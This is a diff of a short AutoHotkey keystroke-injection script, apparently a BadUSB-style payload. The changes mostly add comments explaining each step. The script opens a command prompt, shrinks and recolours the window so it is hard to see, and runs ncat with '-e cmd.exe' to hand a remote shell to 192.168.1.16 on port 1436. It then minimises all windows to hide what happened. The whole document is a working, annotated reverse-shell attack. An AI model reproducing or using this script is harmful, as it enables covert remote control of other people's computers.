@@ -7,20 +7,18 @@ Goto, Payload
 
 Payload:
 Sleep, 1000
-Send #r
+Send #r ; Run prompt
 Sleep, 1000
-Send cmd
+Send cmd ; Opens Command Prompt
 Send {Enter}
 Sleep, 1000
-Send mode con+.cols+718 lines+71 
+Send mode con:cols=18 lines=1 ; Obfuscation, sets the window tho smallest possible size 
 Send {Enter}
 Sleep, 100
-Send color FE
-Send {Enter}
-Send cd +6D D+.^!qThing^!q
+Send color FE ; This makes the text hard to read
 Send {Enter}
 Sleep, 100
-Send ncat.exe 192.168.1.16 1436 -e cmd.exe
+Send ncat.exe 192.168.1.16 1436 -e cmd.exe ; This makes the connection, set IP and port as needed
 Send {Enter}
 Sleep, 100
-Send #d
+Send #d ; This minimizes all apps, hiding the window.
